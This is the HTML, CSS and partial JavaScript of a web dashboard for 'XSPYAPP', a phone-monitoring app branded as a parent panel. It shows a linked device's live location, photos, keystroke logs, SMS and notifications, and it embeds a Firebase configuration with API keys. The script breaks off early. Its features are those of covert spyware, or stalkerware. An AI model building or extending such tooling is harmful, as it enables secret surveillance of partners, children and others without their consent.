<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Panel | XSPYAPP [Aurora Crystal Edition]</title>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        
        :root {
            --bg-main: #0A0F1A;
            --primary-surface: rgba(18, 28, 48, 0.7);
            --secondary-surface: rgba(30, 42, 69, 0.6);
            --card-surface: rgba(22, 33, 54, 0.7);
            --accent-teal: #00A9A5;
            --accent-purple: #8A2BE2;
            --accent-blue: #A7DFFF;
            --accent-pink: #F08080;
            --accent-green: #4CAF50;
            --text-primary: #E0E7FF;
            --text-secondary: #9FAEC2;
            --border-color: rgba(167, 223, 255, 0.2);
            --glow-color: rgba(167, 223, 255, 0.15);
            --shadow-color: rgba(0, 0, 0, 0.4);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            scrollbar-width: thin;
            scrollbar-color: var(--accent-teal) transparent;
        }

        body { 
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-primary);
            overflow: hidden;
        }

        .background-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }

        .aurora-background {
            position: absolute;
            width: 200%;
            height: 200%;
            top: -50%;
            left: -50%;
            background: radial-gradient(ellipse at center, rgba(138, 43, 226, 0.2) 0%, rgba(0, 169, 165, 0.1) 35%, rgba(10, 15, 26, 0) 70%);
            animation: aurora-flow 25s linear infinite;
        }
        
        @keyframes aurora-flow {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.2); }
            100% { transform: rotate(360deg) scale(1); }
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .dashboard-container {
            display: flex;
            height: calc(100vh - 45px);
            transition: all 0.4s ease-in-out;
        }

        /* --- Sidebar --- */
        .sidebar {
            width: 300px;
            flex-shrink: 0; 
            background: var(--primary-surface);
            backdrop-filter: blur(16px);
            padding: 2rem;
            display: flex;
            flex-direction: column;
            border-right: 1px solid var(--border-color);
            transition: transform 0.4s ease-in-out, width 0.4s ease-in-out, padding 0.4s ease-in-out;
            z-index: 1000;
            box-shadow: inset 0 0 40px rgba(10,15,26,0.5);
            overflow: hidden; 
        }
        .dashboard-container.sidebar-hidden .sidebar {
            width: 0;
            padding: 2rem 0;
            transform: translateX(0); /* On desktop, we just shrink it */
        }
        .sidebar > * {
            transition: opacity 0.3s ease-in-out;
            min-width: 236px; /* 300px - 2*2rem padding */
        }
        .dashboard-container.sidebar-hidden .sidebar > * {
            opacity: 0;
            visibility: hidden;
        }

        .sidebar-header { margin-bottom: 2.5rem; display: flex; align-items: center; gap: 15px; flex-shrink: 0; }
        .sidebar-header h2 { color: #fff; font-size: 1.6rem; font-weight: 600; white-space: nowrap; }
        .sidebar-header svg { stroke: var(--accent-blue); flex-shrink: 0;}
        
        .user-list { list-style-type: none; overflow-y: auto; flex-grow: 1; }
        .user-list-item {
            padding: 1rem; border-radius: 10px; cursor: pointer;
            transition: all 0.3s ease; margin-bottom: 1rem;
            display: flex; align-items: center; gap: 15px;
            background: var(--secondary-surface); border: 1px solid var(--border-color);
            white-space: nowrap;
        }
        .user-list-item:hover { transform: translateY(-3px); background: rgba(167, 223, 255, 0.1); box-shadow: 0 5px 15px var(--shadow-color); }
        .user-list-item.active { background: var(--accent-blue); color: var(--bg-main); border-color: var(--accent-blue); box-shadow: 0 0 20px var(--glow-color); }
        .user-list-item.active .user-name, .user-list-item.active .device-name { color: var(--bg-main); }
        .user-list-item.active svg { stroke: var(--bg-main); }
        .user-list-item .user-name { font-weight: 500; font-size: 1.1rem; }
        .user-list-item .device-name { font-size: 0.85rem; opacity: 0.8; }
        
        .sidebar-footer { margin-top: auto; padding-top: 1.5rem; border-top: 1px solid var(--border-color); flex-shrink: 0; }
        #live-chat-btn {
            background: linear-gradient(45deg, var(--accent-purple), var(--accent-teal));
            color: white; padding: 14px; border: none; border-radius: 10px; width: 100%;
            cursor: pointer; font-size: 1rem; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px;
            transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        #live-chat-btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(138, 43, 226, 0.4); }
        #live-chat-btn:disabled { background: var(--text-secondary); cursor: not-allowed; box-shadow: none; transform: none; }

        /* --- Main Content --- */
        .main-content { flex-grow: 1; padding: 3rem; overflow-y: auto; height: 100%; transition: margin-left 0.4s ease-in-out; }
        .main-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 3rem; animation: fadeInUp 0.5s ease-out; gap: 1rem; }
        .main-header-left { display: flex; align-items: center; gap: 1.5rem; }
        .main-header h1 { font-size: 2.5rem; color: #fff; font-weight: 700; }
        
        .header-btn {
            background: var(--secondary-surface); border: 1px solid var(--border-color);
            color: var(--text-primary); cursor: pointer; border-radius: 8px;
            width: 44px; height: 44px; display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease;
        }
        .header-btn:hover { background: var(--accent-teal); color: #fff; border-color: var(--accent-teal); }
        .header-btn svg { transition: transform 0.4s ease; }
        
        #toggle-sidebar-btn { display: flex; }
        #menu-btn { display: none; }
        .dashboard-container.sidebar-hidden #toggle-sidebar-btn svg { transform: rotate(180deg); }


        #logout-btn {
            background: var(--accent-pink); color: white; padding: 12px 20px; border: none;
            border-radius: 10px; cursor: pointer; font-size: 1rem; font-weight: 600; transition: all 0.3s ease;
        }
        #logout-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(240, 128, 128, 0.3); }

        /* --- Category Buttons --- */
        #details-view { display: none; animation: fadeIn 0.8s ease; }
        .category-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 2rem;
            margin-bottom: 3rem;
        }
        .category-btn {
            background-color: var(--secondary-surface); color: var(--text-primary);
            border: 1px solid var(--border-color); border-radius: 16px;
            padding: 1.5rem; min-height: 150px; cursor: pointer;
            font-size: 1rem; font-weight: 500; transition: all 0.3s ease-in-out;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            gap: 1rem; text-align: center; position: relative; overflow: hidden;
        }
        .category-btn::before {
            content: ''; position: absolute; top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: conic-gradient(from 180deg at 50% 50%, var(--accent-purple) 0%, var(--accent-teal) 50%, var(--accent-blue) 100%);
            transition: opacity 0.5s ease; opacity: 0; animation: rotate 10s linear infinite;
        }
        .category-btn:hover::before { opacity: 0.15; }
        .category-btn:hover {
            transform: translateY(-8px);
            box-shadow: 0 10px 25px var(--shadow-color);
            border-color: var(--accent-blue);
        }
        .category-btn > * { position: relative; z-index: 1; }
        .category-btn svg { width: 32px; height: 32px; transition: all 0.3s ease; }
        .category-btn[data-category="coming-soon"] {
            background: repeating-linear-gradient(45deg, var(--secondary-surface), var(--secondary-surface) 10px, rgba(30, 42, 69, 0.8) 10px, rgba(30, 42, 69, 0.8) 20px);
            color: var(--text-secondary);
        }
        .category-btn[data-category="coming-soon"] svg { stroke: var(--text-secondary); }
        @keyframes rotate { to { transform: rotate(360deg); } }
        
        /* --- Auth Page --- */
        #auth-container { display: flex; justify-content: center; align-items: center; height: 100vh; animation: fadeIn 1s ease-out; }
        .auth-card {
            width: 100%; max-width: 420px; background: var(--primary-surface); backdrop-filter: blur(16px);
            padding: 3rem; border-radius: 16px; border: 1px solid var(--border-color);
            text-align: center; box-shadow: 0 10px 40px var(--shadow-color);
        }
        .auth-card h2 { margin-bottom: 2rem; color: #fff; font-size: 2rem; font-weight: 600; }
        
        .auth-tabs { display: flex; background-color: var(--secondary-surface); border-radius: 10px; padding: 5px; margin-bottom: 2rem; }
        .auth-tab-btn {
            flex: 1; padding: 14px; background: transparent; border: none; color: var(--text-secondary);
            font-size: 1rem; font-weight: 500; border-radius: 8px; cursor: pointer; transition: all 0.3s ease;
        }
        .auth-tab-btn.active { background: var(--accent-teal); color: #fff; box-shadow: 0 2px 10px rgba(0, 169, 165, 0.3); }
        
        .auth-card input {
            background-color: var(--secondary-surface); color: var(--text-primary);
            border: 1px solid var(--border-color); padding: 18px; font-size: 1rem;
            transition: all 0.3s; width: 100%; margin-bottom: 1.25rem; border-radius: 10px;
        }
        .auth-card input:focus { outline: none; border-color: var(--accent-teal); box-shadow: 0 0 15px rgba(0, 169, 165, 0.2); }
        
        #submit-auth-btn {
             background: linear-gradient(45deg, var(--accent-teal), var(--accent-purple));
             padding: 16px; font-size: 1.1rem; display: flex; align-items: center;
             justify-content: center; gap: 10px; transition: all 0.3s ease; width: 100%; margin-top: 1rem;
             border-radius: 10px; border: none; cursor: pointer; color: white; font-weight: 600;
        }
        #submit-auth-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 169, 165, 0.3); }
        #error-message { color: var(--accent-pink); margin-top: 1rem; font-weight: 500; min-height: 20px; }
        
        /* --- Modals & Data Display --- */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(10, 15, 26, 0.6); backdrop-filter: blur(10px);
            display: none; justify-content: center; align-items: center;
            z-index: 1001; padding: 20px; animation: fadeIn 0.3s ease;
        }
        .modal-content {
            background: var(--primary-surface); border: 1px solid var(--border-color);
            padding: 2rem; border-radius: 16px; width: 100%; max-width: 900px;
            box-shadow: 0 10px 40px var(--shadow-color);
            display: flex; flex-direction: column; max-height: 90vh;
            animation: fadeInUp 0.4s ease-out;
        }
        .modal-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color);
        }
        .modal-header h3 { margin: 0; color: #fff; font-size: 1.5rem; }
        .modal-body { overflow-y: auto; text-align: left; padding: 0 1rem 1rem 0; }
        .modal-close-btn { background: none; border: none; font-size: 28px; cursor: pointer; color: var(--text-primary); transition: all 0.3s ease; }
        .modal-close-btn:hover { color: var(--accent-teal); transform: rotate(90deg); }

        /* --- Card View Styles --- */
        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; }
        .data-list { display: flex; flex-direction: column; gap: 1.5rem; } /* For single column layouts */
        .data-card {
            background: var(--card-surface);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.5rem;
            transition: all 0.3s ease;
        }
        .data-card:hover {
            transform: translateY(-5px) scale(1.02);
            box-shadow: 0 8px 25px var(--shadow-color);
            border-color: var(--accent-blue);
        }
        .data-card-header { display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem; }
        .data-card-icon { flex-shrink: 0; }
        .data-card-title { font-size: 1.1rem; font-weight: 600; }
        .data-card-body {
            font-size: 0.95rem;
            line-height: 1.6;
            word-break: break-all;
            overflow-wrap: break-word;
        }
        .data-card-footer { font-size: 0.8rem; color: var(--text-secondary); text-align: right; margin-top: 1rem; opacity: 0.8; }
        
        /* FIX: Made selector more specific */
        .location-card .data-card-body > div {
            display: flex;
            gap: 1rem;
            align-items: flex-start;
            margin-bottom: 1rem;
        }
        .map-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 1rem;
            padding: 10px 18px;
            background: var(--accent-teal);
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
            transition: all 0.3s;
            white-space: nowrap; /* FIX: Prevents button text from wrapping */
        }
        .map-link:hover { background: var(--accent-purple); }

        /* --- Modal Buttons --- */
        .data-header { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
        .capture-photo-btn, #refresh-photos-btn {
            color: #fff; padding: 10px 16px; border: 1px solid var(--border-color); border-radius: 8px;
            cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex;
            align-items: center; gap: 8px; transition: all 0.3s ease; background: var(--secondary-surface);
        }
        .capture-photo-btn:hover { background: var(--accent-green); border-color: var(--accent-green); }
        #refresh-photos-btn:hover { background: var(--accent-teal); border-color: var(--accent-teal); }
        
        .ok-btn, .home-btn {
            background: linear-gradient(45deg, var(--accent-teal), var(--accent-purple));
            color: white; padding: 12px 24px; border: none;
            border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: 600; display: block;
            width: 100%; margin-top: 1.5rem; transition: all 0.3s;
        }
        .ok-btn:hover, .home-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(0, 169, 165, 0.4);
        }

        /* --- Chat & SMS UI --- */
        .live-chat-area { display: flex; flex-direction: column; height: 100%; }
        .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column; gap: 1rem; }
        .chat-bubble { padding: 12px 18px; border-radius: 20px; max-width: 80%; width: fit-content; word-wrap: break-word; line-height: 1.5; }
        .chat-bubble.admin, .chat-bubble.auto-reply { background-color: var(--secondary-surface); color: var(--text-primary); align-self: flex-start; border-bottom-left-radius: 5px; }
        .chat-bubble.user { background: linear-gradient(45deg, var(--accent-teal), var(--accent-purple)); color: #fff; align-self: flex-end; border-bottom-right-radius: 5px; }
        .chat-time { font-size: 0.75rem; opacity: 0.7; margin-top: 5px; display: block; text-align: right; }
        
        .chat-input-area { display: flex; padding: 1rem; border-top: 1px solid var(--border-color); gap: 1rem; }
        .chat-input-area input {
            flex-grow: 1; padding: 14px; border-radius: 10px; border: 1px solid var(--border-color);
            background: var(--secondary-surface); color: var(--text-primary); font-size: 1rem;
        }
        .chat-input-area input:focus { outline: none; border-color: var(--accent-teal); }
        .chat-input-area button {
            background-color: var(--accent-teal); border: none; border-radius: 10px;
            padding: 0 18px; cursor: pointer; color: #fff; display: flex;
            align-items: center; justify-content: center; transition: background-color 0.3s;
        }
        .chat-input-area button:hover { background-color: var(--accent-purple); }


        /* --- Other existing styles --- */
        #details-view { display: none; }
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 999; }
        .loader { width: 50px; height: 50px; border-radius: 50%; margin: 40px auto; border: 5px solid var(--secondary-surface); border-top-color: var(--accent-teal); animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .page-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: var(--primary-surface);
            backdrop-filter: blur(10px);
            color: var(--text-secondary);
            font-size: 0.9rem;
            z-index: 1002;
            border-top: 1px solid var(--border-color);
            height: 45px;
            /* FIX: Centering content robustly */
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .page-footer a {
            color: var(--accent-teal);
            text-decoration: none;
            font-weight: 600;
            transition: color 0.3s;
        }
        .page-footer a:hover { color: var(--accent-blue); }
        
        /* --- Responsive --- */
        @media (max-width: 992px) {
            .sidebar {
                position: fixed;
                left: 0;
                top: 0;
                height: 100%;
                transform: translateX(-100%);
                box-shadow: 10px 0 30px rgba(0,0,0,0.5);
                padding-bottom: 75px; /* Fix: Added space for the footer */
            }
            .sidebar.open { transform: translateX(0); }
            .dashboard-container.sidebar-hidden .sidebar { transform: translateX(-100%); } /* Ensure it stays hidden on mobile */
            #toggle-sidebar-btn { display: none; } /* Hide desktop toggle */
            #menu-btn { display: flex; } /* Show mobile menu toggle */
            .main-content { padding: 1.5rem; }
            .main-header h1 { font-size: 2rem; }
            .category-buttons { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1.5rem; }
            .category-btn { min-height: 130px; }
        }
        @media (max-width: 576px) {
            .main-content { padding: 1rem; }
            .main-header h1 { font-size: 1.8rem; }
            .category-buttons { grid-template-columns: repeat(2, 1fr); }
            .auth-card { padding: 2rem; max-width: 90vw; }
        }
    </style>
</head>
<body>
    <div class="background-container">
        <div class="aurora-background"></div>
    </div>
    
    <div id="offline-banner">No Internet Connection. Please check your network.</div>
    <div id="toast-notification"></div>

    <div id="auth-container">
        <div class="auth-card">
            <h2>Parent Panel</h2>
            <div class="auth-tabs">
                <button id="login-tab-btn" class="auth-tab-btn active">Login</button>
                <button id="signup-tab-btn" class="auth-tab-btn">Sign Up</button>
            </div>
            <input type="email" id="email" placeholder="Email">
            <input type="password" id="password" placeholder="Password">
            <button id="submit-auth-btn">
                <span id="submit-auth-btn-text">Login</span>
            </button>
            <p id="error-message"></p>
        </div>
    </div>

    <div id="dashboard" class="dashboard-container">
        <div id="overlay"></div>
        <aside class="sidebar">
            <div>
                <div class="sidebar-header">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                    <h2>Your Children</h2>
                </div>
                <ul id="user-list" class="user-list"></ul>
            </div>
            <div class="sidebar-footer">
                <button id="live-chat-btn" disabled>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
                    <span>Help Desk</span>
                </button>
            </div>
        </aside>

        <main class="main-content">
            <header class="main-header">
                <div class="main-header-left">
                    <button id="toggle-sidebar-btn" class="header-btn">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="3" x2="9" y2="21"></line></svg>
                    </button>
                    <button id="menu-btn" class="header-btn">
                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                    </button>
                    <h1 id="main-content-title">Select Child</h1>
                </div>
                <button id="logout-btn">Logout</button>
            </header>

            <div id="details-view">
                 <div class="category-buttons">
                    <button class="category-btn" data-category="location">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                        <span>Live Location</span>
                    </button>
                    <button class="category-btn" data-category="photo">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                        <span>Photos</span>
                    </button>
                    <button class="category-btn" data-category="keylogger">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#ffab40" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                        <span>Keylogger</span>
                    </button>
                    <button class="category-btn" data-category="sms">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                        <span>SMS</span>
                    </button>
                    <button class="category-btn" data-category="notifications">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                        <span>Notifications</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Live Screen">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg>
                        <span>Live Screen</span>
                    </button>
                     <button class="category-btn" data-category="coming-soon" data-feature-name="Screenshot">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.09 10.59a2.23 2.23 0 0 0-2.2-2.2H5.12a2.23 2.23 0 0 0-2.2 2.2v8.84a2.23 2.23 0 0 0 2.2 2.2h13.78a2.23 2.23 0 0 0 2.2-2.2v-8.84zM6.88 4.71h10.24"></path><line x1="12" y1="2.11" x2="12" y2="4.71"></line></svg>
                        <span>Screenshot</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="File Manager">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                        <span>File Manager</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Call Recording">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path><circle cx="19" cy="5" r="3"></circle></svg>
                        <span>Call Recording</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Voice Recording">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
                        <span>Voice Recording</span>
                    </button>
                    <button class="category-btn" data-category="coming-soon" data-feature-name="Hidden Password">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5 5 0 1 1-7.07-7.07l2 2"></path><path d="M9 12.55L11.45 15"></path><path d="M14.34 14.34L17 17"></path><path d="M1 1l22 22"></path></svg>
                        <span>Hidden Password</span>
                    </button>
                 </div>
            </div>
        </main>
    </div>

    <div id="data-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">Data</h3>
                <button id="modal-close-btn" class="modal-close-btn" data-target="data-modal">×</button>
            </div>
            <div class="modal-body" id="modal-data-display-area">
                </div>
        </div>
    </div>
    
    <div id="chat-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="chat-modal-title">Help Desk</h3>
                <button class="modal-close-btn" data-target="chat-modal">×</button>
            </div>
            <div class="modal-body" style="padding: 0;">
                <div class="live-chat-area">
                    <div class="chat-messages" id="chat-messages-area">
                        </div>
                    <div class="chat-input-area">
                        <input type="text" id="chat-message-input" placeholder="Type a message...">
                        <button id="chat-send-btn">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="signup-success-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Account Created Successfully!</h3>
            </div>
            <div class="modal-body">
                <p style="margin-bottom: 1rem; line-height: 1.6;">
                    <b>Next Step:</b> Install the application on your child's mobile device.
                </p>
                <p style="margin-bottom: 1.5rem; line-height: 1.6;">
                    When you open the app on your child's phone, please use the same Email and Password that you just used to sign up here.
                </p>
                <button id="home-redirect-btn" class="home-btn">Go to Home</button>
            </div>
        </div>
    </div>

    <div id="coming-soon-modal" class="modal-overlay">
       <div class="modal-content">
            <div class="modal-header">
                <h3 id="coming-soon-title">Feature Coming Soon</h3>
            </div>
            <div class="modal-body">
                <p style="margin-bottom: 1rem; line-height: 1.6;">
                    We are working hard to bring you this new feature.
                </p>
                <p style="margin-bottom: 1.5rem; line-height: 1.6;">
                    You will be able to use it as soon as it's ready. Thank you for your patience!
                </p>
                <button class="ok-btn" data-target="coming-soon-modal">Okay</button>
            </div>
        </div>
    </div>
    
    <div id="admin-notification-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Notification from Xspyapp</h3>
            </div>
            <div class="modal-body">
                <p id="admin-notification-text" style="font-size: 1.1rem; line-height: 1.6;"></p>
                <button class="ok-btn" data-target="admin-notification-modal">Okay</button>
            </div>
        </div>
    </div>
    
    <footer class="page-footer">
        © Copyright XSPYAPP. All Rights Reserved by XSPYAPP
    </footer>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
        import { getDatabase, ref, onValue, remove, update, query, orderByChild, equalTo, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
        import { getStorage, ref as storageRef, listAll, getDownloadURL, getMetadata, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
          apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
          authDomain: "home-demo12-d5814.firebaseapp.com",
          databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
          projectId: "home-demo12-d5814",
          storageBucket: "home-demo12-d5814.appspot.com",
          messagingSenderId: "433464727867",
          appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
          measurementId: "G-NHHB06Z9HT"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);
        const storage = getStorage(app);

        // DOM Elements
        const authContainer = document.getElementById('auth-container');
        const dashboard = document.getElementById('dashboard');
        const userList = document.getElementById('user-list');
        const mainContentTitle = document.getElementById('main-content-title');
        const detailsView = document.getElementById('details-view');
        const categoryButtonsContainer = document.querySelector('.category-buttons');
        const menuBtn = document.getElementById('menu-btn');
        const sidebar = document.querySelector('.sidebar');
        const overlay = document.getElementById('overlay');
        const dataModal = document.getElementById('data-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalDataDisplayArea = document.getElementById('modal-data-display-area');
        const errorMessage = document.getElementById('error-message');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const loginTabBtn = document.getElementById('login-tab-btn');
        const signupTabBtn = document.getElementById('signup-tab-btn');
        const submitAuthBtn = document.getElementById('submit-auth-btn');
        const submitAuthBtnText = document.getElementById('submit-auth-btn-text');
        const signupSuccessModal = document.getElementById('signup-success-modal');
        const homeRedirectBtn = document.getElementById('home-redirect-btn');
        const comingSoonModal = document.getElementById('coming-soon-modal');
        const comingSoonTitle = document.getElementById('coming-soon-title');
        const toastNotification = document.getElementById('toast-notification');
        const offlineBanner = document.getElementById('offline-banner');
        const adminNotificationModal = document.getElementById('admin-notification-modal');
        const adminNotificationText = document.getElementById('admin-notification-text');
        const liveChatBtn = document.getElementById('live-chat-btn');
        const chatModal = document.getElementById('chat-modal');
        const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');

        let authMode = 'login';
        let activeDataListener = null;
        let activeNotificationListener = null;
        let activeChatListener = null;
        let selectedChildInfo = {};

        // --- Event Listeners ---
        
        // Sidebar Toggle
        toggleSidebarBtn.addEventListener('click', () => {
            dashboard.classList.toggle('sidebar-hidden');
        });

